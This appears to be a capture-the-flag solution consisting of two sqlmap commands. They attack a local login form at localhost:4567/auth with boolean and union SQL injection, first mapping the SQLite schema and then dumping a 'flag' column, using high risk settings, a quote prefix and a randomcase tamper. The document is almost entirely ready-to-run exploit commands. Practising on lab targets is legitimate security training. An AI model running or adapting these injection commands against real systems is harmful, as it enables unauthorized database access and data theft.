# recon -> get table schema
sqlmap -u http://localhost:4567/auth --method=POST --data='user=ijkl&pass=b' --dbms=sqlite --os=linux --schema --exclude-sysdbs --risk 3 --no-escape --prefix='"' --technique=BU --string=Welcome --union-cols=2-5 --union-char=1
# dump table 123flag123 column flag
sqlmap -u http://localhost:4567/auth --method=POST --data='user=ijkl&pass=b' --dbms=SQLite --os=linux --dump -T 123flag123 -C flag --risk 3 --no-escape --prefix='"' --technique=BU --string=Welcome --union-cols=2-5 --union-char=1 --flush-session --tamper=randomcase
